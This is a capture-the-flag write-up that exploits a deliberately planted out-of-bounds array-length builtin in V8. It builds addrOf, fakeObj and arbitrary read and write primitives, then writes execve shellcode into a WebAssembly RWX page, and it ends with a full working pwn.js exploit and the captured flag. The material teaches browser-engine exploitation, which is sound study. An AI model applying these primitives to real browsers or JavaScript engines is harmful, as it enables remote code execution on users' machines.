--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -653,6 +653,32 @@ BUILTIN(ArrayUnshift) {
   return Smi::FromInt(new_length);
 }
 
+BUILTIN(ArrayWhutSet) {
+  HandleScope scope(isolate);
+  DCHECK_EQ(2, args.length());
+  DCHECK(IsJSArray(*args.receiver()));
+
+  Handle<Object> array_obj = args.at(0);
+  Handle<Object> new_value_obj = args.at(1);
+
+  DCHECK(IsNumber(new_value_obj));
+
+  // Cast the array_obj to a JSArray handle
+  Handle<JSArray> array = Handle<JSArray>::cast(array_obj);
+
+  uint32_t new_value_uint32 = static_cast<uint32_t>(Object::Number(*new_value_obj));
+
+  if (new_value_uint32 < 0 || new_value_uint32 > static_cast<double>(kMaxUInt32)) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewRangeError(MessageTemplate::kInvalidArrayLength));
+  }
+
+  array->set_length(Smi::FromInt(new_value_uint32));
+
+  // Return undefined as the result (V8 convention for setter operations)
+  return ReadOnlyRoots(isolate).undefined_value();
+
+}
+
 // Array Concat -------------------------------------------------------------
```
{% endcode %}

above changes are the actual code that defines the new builtin function behaviour and can be explained as follows:

* first it checks the argument is exactly 2 using `DCHECK_EQ(2, args.length());`, recall with OOP, `this` is always passed as the first argument
* then it checks for the first argument has to be a type of `JSArray`&#x20;
* it then cast the first argument to `JSArray` and create a new number from the second argument
* next it changes the length of the array to be the said number

{% code title="builtins-definitions.h" %}
```diff
 namespace {
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index a522d377569..12a7b265f6f 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -443,6 +443,7 @@ namespace internal {
   TFJ(ArrayPrototypeValues, kJSArgcReceiverSlots, kReceiver)                   \
   /* ES6 #sec-%arrayiteratorprototype%.next */                                 \
   TFJ(ArrayIteratorPrototypeNext, kJSArgcReceiverSlots, kReceiver)             \
+  CPP(ArrayWhutSet)                                                            \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..e02a5e0076d 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtin::kArrayWhutSet:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 4d363e33ca6..15a950b5fb3 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3337,6 +3337,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+/*
   global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
@@ -3384,7 +3385,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
   }
-
+*/
   return global_template;
 }
```
{% endcode %}

above changes are quite irrelevant but important to add the builtin function correctly

{% code title="bootstrapper.cc" %}
```diff
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index de0b6df336b..bd19683379b 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2566,6 +2566,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "join", Builtin::kArrayPrototypeJoin,
                           1, false);
+    SimpleInstallFunction(isolate_, proto, "whutset", Builtin::kArrayWhutSet,
+                          0, false);
 
     {  // Set up iterator-related properties.
       Handle<JSFunction> keys = InstallFunctionWithBuiltinId(
```
{% endcode %}

the patch in `bootstrapper.cc` installs the builtin function and defines what the method is called, in this case its `whutset`

to conclude to this is how we can use the new builtin function

```javascript
let arr = [1, 2, 3, 4, 5];
console.log(arr.length); // Output: 5
arr.whutset(2);
console.log(arr.length); // Output: 2
```

this of course introduces an OOB vulnerability which is I think is the most common and the most powerful vulnerability in the V8 exploitation scope.&#x20;

### Exploitation Foundation

as per my understanding, the steps to pwn a V8 is to slowly build up these primitives:

* leak float array maps and object array maps
* construct `AddressOf` primitive
* construct `FakeObject` primitive
* construct arbitrary read and arbitrary write primitive&#x20;

though this is probably only applicable to the easier and introductory side of the challenges as I haven't explore the other more advanced stuff.

nonetheless I think it provides a good foundation to someone who is new to this, and I'll go with it

first setting up our debugging environment in gdb:

```bash
pwndbg> file d8
Reading symbols from d8...
(No debugging symbols found in d8)
pwndbg> set args --allow-natives-syntax --shell tmp.js
```

then let's start off by defining our helper function, objects, and arrays:

```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// d8 only
function dp(x){ %DebugPrint(x); }
function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj = {"A":1};
var obj_arr = [obj, obj];
```

through debug printing and examining the memory I found out we end up with this memory layout:

<figure><img src="../../.gitbook/assets/image (7).png" alt="" width="344"><figcaption></figcaption></figure>

can be verified through telescope in gdb

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Getting Maps

with this, to leak the map of floating array, we can change the length of the `float_arr` to gain OOB and read `float_arr[4]` this will return properties | maps, as we only want the maps we'll only grab the lower 32 bits

```javascript
float_arr.whutset(50);

var float_arr_map = itof(ftoi(float_arr[4]) & 0xffffffffn);
console.log("[*] float_arr_map: 0x" + ftoi(float_arr_map).toString(16));
dp(float_arr)
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

to leak the `obj_arr`'s map, we can calculate its offset using the map we previously leaked or make use of the OOB to read it, both works

```javascript
var obj_arr_map = itof(ftoi(float_arr_map) + 128n);
console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));
var obj_arr_map = itof(ftoi(float_arr[13]) >> 32n);
console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));
dp(obj_arr)
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### AddressOf Primitive

now alleviating OOB, we can get an address of an object,

```javascript
function addrOf(obj) {
    // continue...
}
```

first, we'll put the object we want the address of within the array

```javascript
obj_arr[0] = obj;
```

then we'll change the `obj_array`'s map into a floating one

```javascript
float_arr[13] = itof(ftoi(float_arr_map) << 32n);
```

then, accessing the elements of the `obj_array` will treated as a raw floating point instead of an object address that will be dereferenced, again because of pointer tagging, the treated raw float is 8 bytes, though the object's address is only the lower 32 bits.

```javascript
let addr = Number(ftoi(obj_arr[0]) & 0xffffffffn);
```

lastly, restore the map to the original object map to perform cleanup

```javascript
float_arr[13] = itof(ftoi(obj_arr_map) << 32n);
return BigInt(addr);
```

we can try if this is working

```javascript
console.log("[*] addrOf obj_arr: 0x" + addrOf(obj_arr).toString(16));
dp(obj_arr);
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

it works!

### FakeObject Primitive

fake object is one of the most confusing primitive as I first learn V8 exploitation, the purpose of it will eventually be used to gain arbitrary read/write. to better understand this, there's this diagram in the youtube video I linked before that helped me greatly understand this:

<figure><img src="../../.gitbook/assets/image (14).png" alt="" width="563"><figcaption><p>NUS Greyhats Learn2Learn: V8 Exploitation</p></figcaption></figure>

{% hint style="info" %}
the diagram is for V8 version <= 8
{% endhint %}

the concept is roughly the same as fake chunk in heap exploits, we want to construct a fake object, in this case its `JSArray` of type floating points. to do this we have to trick the V8 such that a variable will hold an address at the fake object and treat it as an object.

the gist of it is that, later on we will alleviate the fake object's elements to an arbitrary address, accessing the fake object will then dereference the address enabling us able to read/write to it.&#x20;

```javascript
function fakeObj(addr) {
    // continue...
}
```

first, we'll set `obj_arr[0]` to the address where we want to put the fake object at, note that I also preserve the `length` of `FixedArray` just in case. (if you're getting confused here, take a look again at our memory layout above)

```javascript
float_arr[12] = itof(0x4n) + itof(addr << 32n);
```

next, the map of `obj_arr` is still an object, but for good measures, I decided to make sure that the map is indeed an object array map

```javascript
float_arr[13] = itof(ftoi(obj_arr_map) << 32n); // also nullifies the 2nd index of obj_arr
```

next, accessing the element will dereference the address we just put before, since the array is an object type, the V8 will then store variable `fake` as an object. this is the overall gist of the primitive.&#x20;

```javascript
let fake = obj_arr[0];
return fake;
```

### Arbitrary Read

from the diagram before, we're going to craft a fake object within a floating array, so let's setup just that:

```javascript
var arb_rw_arr = [(float_arr_map), 1.2, 1.3, 1.4];
console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;
        
    // continue...
}
```

then we'll calculate the offset to our fake object from `arb_rw_arr`'s `JSArray`

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```javascript
let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
```

then different from V8 below version 8, where we would put our elements at `arb_rw_arr[2]`, since the `map` and `properties` are 32 bit each, the `elements` would be placed at the lower bits at `arb_rw_arr[1]`

this also applies to the offset when reading, where the `map` and `length` in `FixedDoubleArray` is both 32 bit, the offset would be only 0x8 instead of 0x10 as previously shown in the diagram.

```javascript
arb_rw_arr[1] = itof(addr - 0x8n);
```

then when we treat `fake` as an array, such as `fake[0]`, the V8 will look at the map and confirmed that it is an `JSArray` of type float and then read at the raw values at `*(elements - 0x10)`.

```javascript
return ftoi(fake[0]);
```

let's put it into the test

```javascript
console.log("[*] Result: 0x" + arb_read(addrOf(arb_rw_arr)).toString(16));
dp(arb_rw_arr)
```

however it failed,

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

I tried changing the address to other ones, but it returns the same result

we expect result to contain the map | properties of `arb_rw_arr` but instead we get what looks like a higher bits of lib address. the reason for this is because our fake object only fakes the `map` and `elements` field and completely ignore the `properties` and `length` fields.&#x20;

so let's fix that, I set the `properties` to 0x725 which seems to be constant throughout the objects I debug printed, for the `length` it could as arbitrary as you want. we end up with this script for this primitive:

```javascript
var arb_rw_arr = [(itof(0x725n << 32n)) + (float_arr_map), 1.2, 1.3, 1.4];
console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x10n);
    return ftoi(fake[0]);
}
```

now putting it to the test once more:&#x20;

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

now we get the result as expected

### Arbitrary Write

arbitrary write is exactly the same with read, but instead of return `fake[0]` we do assignment on it

```javascript
function arb_write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    fake[0] = itof(val);
}
```

however as explained in the NUS Greyhat's video, copying large amount of memory this way will not work and will cause a segfault (I'm also not sure why), a better way to do this is through the Dataview buffer's backing store

it's basically a field that points to region of memory where you then can use the Dataview methods to alter the content of it.&#x20;

using the arb\_write above, you can overwrite the backing store to point to your arbitrary address and then uses its method to write to it

```javascript
var array_of_data = [1n, 2n, 3n, 4n]
function copy(addr, data_arr) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrOf(buf);
    let backing_store_addr = buf_addr - 1n + 0x2cn;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}
copy(addrOf(where), array_of_data);
```

### Code Execution

to gain code execution, I will go through the web assembly shellcode route, where we will allocate a page for a wasm code to get an rwx page and overwrite it with our shellcode instead.

I initially thought of why bother go through the previous primitives if we're able to execute wasm code anyway, can't we just make the wasm code our malicious code instead? the answer is no because its simply not a valid wasm code (I think lol)

to do this, lets instantiate a valid web assembly:

```javascript
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
```

the next part is quite different from the blog and video I linked, in their case, the rwx page can be found at an offset from `wasm_instace` however in this case I found the offset is quite random and not always fixed.&#x20;

after quite a bit of repeated `dp(wasm_instance)` I found that the `wasm_instance` has a field called `trusted_data` that contains the rwx page, which seems to be at a fixed offset.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

so calculate the offset and do the dereferencing stuff, we're able to get a reliable address of the rwx page

```javascript
var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
var rwx = arb_read(wasm_trusted_data + 0x30n);
console.log("[*] rwx: 0x" + rwx.toString(16));
```

next, using arbitrary write we'll copy the our shellcode to the rwx page, and finally execute the wasm function.

```javascript
var shellcode = [
    0x480000000d3d8d48n,
    0x003bb8d23148f631n,
    0x6165722f050f0000n,
    0x0067616c6664n,
];

copy(rwx, shellcode);

console.log("[+] executing execve('/readflag', 0, 0)");
f();
```

and here's the script being ran againts remote:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

below is the full exploit:

{% code title="pwn.js" %}
```javascript
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// d8 only
// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj = {"A":1};
var obj_arr = [obj, obj];

float_arr.whutset(50);

var float_arr_map = itof(ftoi(float_arr[4]) & 0xffffffffn);
console.log("[*] float_arr_map: 0x" + ftoi(float_arr_map).toString(16));
var obj_arr_map = itof(ftoi(float_arr_map) + 128n);
console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));

function addrOf(obj) {
    obj_arr[0] = obj;
    float_arr[13] = itof(ftoi(float_arr_map) << 32n);
    let addr = Number(ftoi(obj_arr[0]) & 0xffffffffn);
    float_arr[13] = itof(ftoi(obj_arr_map) << 32n);
    return BigInt(addr);
}

function fakeObj(addr) {
    float_arr[12] = itof(0x4n) + itof(addr << 32n);
    float_arr[13] = itof(ftoi(obj_arr_map) << 32n);
    let fake = obj_arr[0];
    return fake;
}

var arb_rw_arr = [(itof(0x725n << 32n)) + (float_arr_map), 1.2, 1.3, 1.4];
console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    fake[0] = itof(val);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
var rwx = arb_read(wasm_trusted_data + 0x30n);
console.log("[*] rwx: 0x" + rwx.toString(16));

var shellcode = [
    0x480000000d3d8d48n,
    0x003bb8d23148f631n,
    0x6165722f050f0000n,
    0x0067616c6664n,
];

function copy(addr, data_arr) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrOf(buf);
    let backing_store_addr = buf_addr - 1n + 0x24n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

copy(rwx, shellcode);

console.log("[+] executing execve('/readflag', 0, 0)");
f();
```
{% endcode %}

{% hint style="success" %}
Flag: _**NCW{603f1e4f172d5a4305e649aea9425636}**_
{% endhint %}
